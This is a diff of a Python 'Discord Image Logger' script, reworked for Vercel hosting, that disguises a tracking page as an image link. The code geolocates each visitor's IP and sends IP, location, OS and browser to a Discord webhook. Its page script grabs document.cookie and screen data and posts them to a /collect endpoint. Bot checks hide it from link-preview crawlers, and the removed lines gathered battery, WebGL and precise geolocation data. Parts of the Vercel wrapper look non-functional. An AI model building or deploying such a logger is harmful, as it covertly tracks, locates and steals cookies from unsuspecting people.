@@ -1,14 +1,13 @@
-# Image Logger Plus
+# Image Logger Plus - Vercel Compatible
 # Enhanced for Cybersecurity Project
-# Includes screenshot, webcam capture, and additional data collection
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, re, json
+import traceback, requests, base64, httpagentparser, re, json, os
 
 __app__ = "Discord Image Logger Plus"
 __description__ = "Advanced IP and data collection tool"
-__version__ = "v3.0"
+__version__ = "v3.1"
 __author__ = "Cybersecurity Student"
 
 config = {
@@ -37,6 +36,8 @@ config = {
 blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
+    if not ip or not useragent:
+        return False
     if ip.startswith(("34", "35")):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
@@ -47,66 +48,64 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while logging data!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
+    try:
+        requests.post(config["webhook"], json={
+            "username": config["username"],
+            "content": "@everyone",
+            "embeds": [
+                {
+                    "title": "Image Logger - Error",
+                    "color": config["color"],
+                    "description": f"An error occurred while logging data!\n\n**Error:**\n```\n{error}\n```",
+                }
+            ],
+        }, timeout=5)
+    except:
+        pass
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, additional_data=None):
-    if ip.startswith(blacklistedIPs):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, additional_data=None):
+    if not ip or ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
-    
     if bot:
         if config["linkAlerts"]:
-            requests.post(config["webhook"], json = {
-                "username": config["username"],
-                "content": "",
-                "embeds": [
-                    {
-                        "title": "Image Logger - Link Sent",
-                        "color": config["color"],
-                        "description": f"Image Logging link sent!\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
-                    }
-                ],
-            })
+            try:
+                requests.post(config["webhook"], json={
+                    "username": config["username"],
+                    "content": "",
+                    "embeds": [
+                        {
+                            "title": "Image Logger - Link Sent",
+                            "color": config["color"],
+                            "description": f"Image Logging link sent!\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
+                        }
+                    ],
+                }, timeout=5)
+            except:
+                pass
         return
 
-    ping = "@everyone"
+    try:
+        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
+    except:
+        info = {}
 
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info.get("proxy"):
-        if config["vpnCheck"] == 2:
-                return
-        if config["vpnCheck"] == 1:
-            ping = ""
-    
+    ping = "@everyone" if not info.get("proxy") else ""
+
     if info.get("hosting"):
-        if config["antiBot"] == 4:
-            if info.get("proxy"):
-                pass
-            else:
-                return
-        elif config["antiBot"] == 3:
-                return
-        elif config["antiBot"] == 2:
-            if info.get("proxy"):
-                pass
-            else:
-                ping = ""
-        elif config["antiBot"] == 1:
-                ping = ""
+        if config["antiBot"] in [3, 4]:
+            return
+        elif config["antiBot"] in [1, 2]:
+            ping = ""
 
-    os, browser = httpagentparser.simple_detect(useragent)
-    
+    os_name, browser = "Unknown", "Unknown"
+    if useragent:
+        try:
+            os_name, browser = httpagentparser.simple_detect(useragent)
+        except:
+            pass
+
     embed = {
         "username": config["username"],
         "content": ping,
@@ -119,21 +118,17 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **Endpoint:** {endpoint}
                 
 **IP Info:**
-> **IP:** {ip if ip else 'Unknown'}
+> **IP:** {ip}
 > **ISP:** {info.get('isp', 'Unknown')}
-> **ASN:** {info.get('as', 'Unknown')}
 > **Country:** {info.get('country', 'Unknown')}
 > **City:** {info.get('city', 'Unknown')}
-> **Coords:** {f"{info.get('lat')}, {info.get('lon')}" if not coords else coords} ({'Approximate' if not coords else 'Precise'})
+> **Coords:** {f"{info.get('lat', '?')}, {info.get('lon', '?')}" if not coords else coords}
 > **Mobile:** {info.get('mobile', 'Unknown')}
 > **VPN/Proxy:** {info.get('proxy', 'Unknown')}
-> **Hosting:** {info.get('hosting', 'Unknown')}
 
 **System Info:**
-> **OS:** {os}
+> **OS:** {os_name}
 > **Browser:** {browser}
-> **User Agent:** 
-```{useragent}```
 
 **Additional Data:**
 {format_additional_data(additional_data)}
@@ -144,7 +139,12 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     
     if url: 
         embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
+    
+    try:
+        requests.post(config["webhook"], json=embed, timeout=5)
+    except:
+        pass
+
     return info
 
 def format_additional_data(data):
@@ -157,54 +157,166 @@ binaries = {
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
-    def handleRequest(self):
-        try:
-            if config["imageArgument"]:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                else:
-                    url = config["image"]
-            else:
-                url = config["image"]
+    def do_GET(self):
+        self.handle_request()
+        
+    def do_POST(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        if content_length:
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data)
+                if self.path.endswith('/collect'):
+                    self.handle_data_collection(data)
+                    return
+            except:
+                pass
+        self.handle_request()
 
-            # Enhanced data collection
+    def handle_request(self):
+        try:
+            # Get client IP from Vercel headers
+            ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
+            if not ip:
+                ip = self.headers.get('x-real-ip', 'Unknown')
+
+            # Skip blacklisted IPs
+            if ip.startswith(blacklistedIPs):
+                self.send_response(403)
+                self.end_headers()
+                return
+
+            # Parse URL parameters
+            parsed_path = parse.urlparse(self.path)
+            query_params = parse.parse_qs(parsed_path.query)
+            
+            # Handle data collection endpoint
+            if parsed_path.path.endswith('/collect'):
+                self.send_response(200)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({"status": "success"}).encode())
+                return
+
+            # Get image URL
+            url = config["image"]
+            if config["imageArgument"]:
+                if query_params.get("url"):
+                    url = base64.b64decode(query_params["url"][0]).decode()
+                elif query_params.get("id"):
+                    url = base64.b64decode(query_params["id"][0]).decode()
+
+            # Prepare basic data
             additional_data = {
-                "Cookies": self.headers.get('Cookie', 'None'),
                 "Referer": self.headers.get('Referer', 'None'),
                 "Language": self.headers.get('Accept-Language', 'None'),
-                "Encoding": self.headers.get('Accept-Encoding', 'None'),
-                "Connection": self.headers.get('Connection', 'None')
+                "Endpoint": parsed_path.path
             }
 
-            data = f'''<!DOCTYPE html>
+            # Serve bot requests
+            user_agent = self.headers.get('user-agent', '')
+            if botCheck(ip, user_agent):
+                self.send_response(200 if config["buggedImage"] else 302)
+                if config["buggedImage"]:
+                    self.send_header('Content-type', 'image/jpeg')
+                    self.end_headers()
+                    self.wfile.write(binaries["loading"])
+                else:
+                    self.send_header('Location', url)
+                    self.end_headers()
+                
+                makeReport(
+                    ip, 
+                    user_agent, 
+                    endpoint=parsed_path.path, 
+                    url=url,
+                    additional_data={"Status": "Bot detected"}
+                )
+                return
+
+            # Serve HTML to regular users
+            html = self.generate_html(url)
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(html.encode())
+
+            # Make initial report
+            makeReport(
+                ip, 
+                user_agent, 
+                endpoint=parsed_path.path, 
+                url=url,
+                additional_data={"Status": "Initial access"}
+            )
+        
+        except Exception as e:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b'500 - Internal Server Error')
+            reportError(str(e))
+
+    def handle_data_collection(self, data):
+        try:
+            # Get client IP from Vercel headers
+            ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
+            if not ip:
+                ip = self.headers.get('x-real-ip', 'Unknown')
+                
+            user_agent = self.headers.get('user-agent', 'Unknown')
+            
+            # Prepare additional data
+            additional_data = {
+                "Screen Size": data.get('systemInfo', {}).get('Screen Size', 'Unknown'),
+                "Device Memory": data.get('systemInfo', {}).get('Device Memory', 'Unknown'),
+                "CPU Cores": data.get('systemInfo', {}).get('CPU Cores', 'Unknown'),
+                "Location": data.get('coords', 'None'),
+                "Referrer": data.get('referrer', 'None'),
+                "Cookies": (data.get('cookies', 'None')[:50] + "...") if data.get('cookies') else "None"
+            }
+
+            makeReport(
+                ip, 
+                user_agent, 
+                additional_data=additional_data, 
+                endpoint="/collect"
+            )
+
+        except Exception as e:
+            reportError(f"Data collection error: {str(e)}")
+
+    def generate_html(self, image_url):
+        return f'''<!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>Loading Image...</title>
     <style>
         body {{
             margin: 0;
             padding: 0;
             background-color: #f0f0f0;
             font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
         }}
         .container {{
             max-width: 800px;
-            margin: 50px auto;
-            text-align: center;
+            padding: 20px;
         }}
         .img-container {{
-            background-image: url('{url}');
-            background-position: center center;
-            background-repeat: no-repeat;
-            background-size: contain;
+            margin: 0 auto;
             width: 100%;
-            height: 60vh;
+            max-width: 600px;
             cursor: pointer;
-            margin-bottom: 20px;
-            border: 2px solid #ddd;
+        }}
+        .img-container img {{
+            width: 100%;
             border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
         }}
         .message {{
             color: #666;
@@ -215,216 +327,134 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
 </head>
 <body>
     <div class="container">
-        <div class="img-container" onclick="collectData()"></div>
+        <div class="img-container" onclick="collectData()">
+            <img src="{image_url}" alt="Loading image">
+        </div>
         <div class="message">Click the image to view full size</div>
     </div>
 
     <script>
-        // Enhanced data collection
         async function collectData() {{
-            try {{
-                // System information
-                const systemInfo = {{
-                    "Screen Size": `${screen.width}x${screen.height}`,
-                    "Color Depth": screen.colorDepth + " bits",
-                    "Device Memory": navigator.deviceMemory || "Unknown",
-                    "CPU Cores": navigator.hardwareConcurrency || "Unknown",
-                    "Browser Plugins": Array.from(navigator.plugins).map(p => p.name).join(', ') || "None",
-                    "WebGL Vendor": getWebGLVendor(),
-                    "Battery Status": await getBatteryStatus(),
-                    "Network Info": navigator.connection ? JSON.stringify(getNetworkInfo()) : "Unavailable"
-                }};
-                
-                // Attempt to get precise location
-                let coords = await getLocation();
-                
-                // Send data to server
-                sendCollectedData(systemInfo, coords);
-                
-            }} catch (error) {{
-                console.error('Data collection error:', error);
-            }}
-        }}
-
-        function getWebGLVendor() {{
-            try {{
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                return gl ? gl.getParameter(gl.VENDOR) : "Unavailable";
-            }} catch (e) {{
-                return "Error";
-            }}
-        }}
-
-        async function getBatteryStatus() {{
-            try {{
-                if ('getBattery' in navigator) {{
-                    const battery = await navigator.getBattery();
-                    return `${{Math.round(battery.level * 100)}}% (${{battery.charging ? 'Charging' : 'Not Charging'}})`;
-                }}
-                return "Unavailable";
-            }} catch (e) {{
-                return "Error";
-            }}
-        }}
-
-        function getNetworkInfo() {{
-            const conn = navigator.connection;
-            return {{
-                "Type": conn.type || "Unknown",
-                "Effective Type": conn.effectiveType || "Unknown",
-                "Downlink (Mbps)": conn.downlink || "Unknown",
-                "RTT (ms)": conn.rtt || "Unknown",
-                "Save Data": conn.saveData ? "Enabled" : "Disabled"
-            }};
-        }}
-
-        async function getLocation() {{
-            return new Promise((resolve) => {{
-                if (!navigator.geolocation) {{
-                    resolve("Geolocation not supported");
-                    return;
-                }}
-                
-                navigator.geolocation.getCurrentPosition(
-                    position => {{
-                        const coords = `${{position.coords.latitude}}, ${{position.coords.longitude}}`;
-                        resolve(coords);
-                    }},
-                    error => {{
-                        resolve(`Error: ${{error.message}}`);
-                    }},
-                    {{ timeout: 5000 }}
-                );
-            }});
-        }}
-
-        function sendCollectedData(systemInfo, coords) {{
             const data = {{
-                systemInfo: systemInfo,
-                coords: coords,
+                screenSize: `${screen.width}x${screen.height}`,
                 referrer: document.referrer || "None",
                 cookies: document.cookie || "None"
             }};
             
-            // Send to server
-            fetch('/collect', {{
-                method: 'POST',
-                headers: {{ 'Content-Type': 'application/json' }},
-                body: JSON.stringify(data)
-            }}).then(response => {{
-                // Redirect after data collection
-                window.location.href = '{config['image']}';
-            }}).catch(error => {{
-                console.error('Error sending data:', error);
-                window.location.href = '{config['image']}';
-            }});
+            try {{
+                // Send data to server
+                await fetch('./collect', {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify(data)
+                }});
+                
+                // Proceed to actual image
+                window.location.href = "{image_url}";
+                
+            }} catch (error) {{
+                console.error('Error:', error);
+                window.location.href = "{image_url}";
+            }}
         }}
     </script>
 </body>
-</html>
-'''.encode()
+</html>'''
+
+# Vercel handler function
+def handler(request):
+    from io import BytesIO
+    import sys
+    
+    class VercelWrapper:
+        def __init__(self, request):
+            self.request = request
+            self.headers = request.headers
+            self.path = request.path
+            self.command = request.method
+            self.wfile = BytesIO()
+            self.rfile = BytesIO(request.get_body())
             
-            if self.path == '/collect':
-                self.handleDataCollection()
-                return
+        def get_response(self):
+            self.wfile.seek(0)
+            body = self.wfile.read()
+            return {
+                'statusCode': self.status,
+                'headers': dict(self.response_headers),
+                'body': body.decode('utf-8') if isinstance(body, bytes) else body
+            }
+    
+    # Create wrapper
+    wrapper = VercelWrapper(request)
+    wrapper.response_headers = []
+    wrapper.status = 200
+    
+    # Create handler
+    handler = ImageLoggerAPI()
+    handler.headers = wrapper.headers
+    handler.path = wrapper.path
+    handler.command = wrapper.command
+    handler.wfile = wrapper.wfile
+    handler.rfile = wrapper.rfile
+    
+    # Handle request
+    if wrapper.command == 'GET':
+        handler.do_GET()
+    elif wrapper.command == 'POST':
+        handler.do_POST()
+    
+    return wrapper.get_response()
 
-            if self.headers.get('x-forwarded-for', '').startswith(blacklistedIPs):
-                return
+# Vercel requires this export
+if os.getenv('VERCEL'):
+    from http.server import BaseHTTPRequestHandler
+    import json as vercel_json
+    
+    class VercelHandler(BaseHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, **kwargs)
+        
+        def do_GET(self):
+            self.handle_request()
             
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-                self.end_headers()
-
-                if config["buggedImage"]: 
-                    self.wfile.write(binaries["loading"])
-
-                makeReport(
-                    self.headers.get('x-forwarded-for'), 
-                    self.headers.get('user-agent'), 
-                    endpoint=self.path.split("?")[0], 
-                    url=url,
-                    additional_data={"Status": "Bot detected"}
-                )
-                return
+        def do_POST(self):
+            self.handle_request()
             
-            else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(
-                        self.headers.get('x-forwarded-for'), 
-                        self.headers.get('user-agent'), 
-                        location, 
-                        s.split("?")[0], 
-                        url=url,
-                        additional_data={"Status": "Direct access"}
-                    )
-                else:
-                    result = makeReport(
-                        self.headers.get('x-forwarded-for'), 
-                        self.headers.get('user-agent'), 
-                        endpoint=s.split("?")[0], 
-                        url=url,
-                        additional_data={"Status": "Direct access"}
-                    )
+        def handle_request(self):
+            try:
+                # Simplified handling for Vercel
+                ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
+                user_agent = self.headers.get('user-agent', '')
                 
+                # Send response
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
                 self.end_headers()
-                self.wfile.write(data)
-        
-        except Exception as e:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error')
-            reportError(traceback.format_exc())
-
-    def handleDataCollection(self):
-        content_length = int(self.headers.get('Content-Length', 0))
-        post_data = self.rfile.read(content_length)
-        
-        try:
-            data = json.loads(post_data)
-            ip = self.headers.get('x-forwarded-for')
-            user_agent = self.headers.get('user-agent')
-            
-            # Prepare additional data
-            additional_data = {
-                "Collected Location": data.get('coords', 'None'),
-                "Screen Size": data['systemInfo']['Screen Size'],
-                "Device Memory": data['systemInfo']['Device Memory'],
-                "CPU Cores": data['systemInfo']['CPU Cores'],
-                "WebGL Vendor": data['systemInfo']['WebGL Vendor'],
-                "Battery Status": data['systemInfo']['Battery Status'],
-                "Network Type": json.loads(data['systemInfo']['Network Info'])['Effective Type'],
-                "Referrer": data.get('referrer', 'None'),
-                "Cookies": data.get('cookies', 'None')[:100] + "..." if len(data.get('cookies', '')) > 100 else data.get('cookies', 'None')
-            }
-
-            makeReport(ip, user_agent, additional_data=additional_data, endpoint="/collect")
-
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({"status": "success"}).encode())
-            
-        except Exception as e:
-            reportError(f"Data collection error: {str(e)}\n\n{traceback.format_exc()}")
-            self.send_response(500)
-            self.end_headers()
-
-    def do_GET(self):
-        self.handleRequest()
-        
-    def do_POST(self):
-        if self.path == '/collect':
-            self.handleDataCollection()
-        else:
-            self.handleRequest()
-
-handler = app = ImageLoggerAPI
+                
+                # Get image URL
+                url = config["image"]
+                parsed_path = parse.urlparse(self.path)
+                query_params = parse.parse_qs(parsed_path.query)
+                if config["imageArgument"] and query_params.get("url"):
+                    url = base64.b64decode(query_params["url"][0]).decode()
+                
+                # Return HTML
+                html = ImageLoggerAPI().generate_html(url)
+                self.wfile.write(html.encode())
+                
+                # Make report
+                makeReport(ip, user_agent, endpoint=parsed_path.path, url=url)
+                
+            except Exception as e:
+                self.send_error(500, message=str(e))
+                reportError(str(e))
+    
+    # Export for Vercel
+    def vercel_entrypoint(request):
+        # Vercel serverless handler
+        handler = VercelHandler(request)
+        return handler.handle_request()
+    
+    # Export for Vercel
+    def vercel_handler(request, context):
+        return vercel_entrypoint(request)
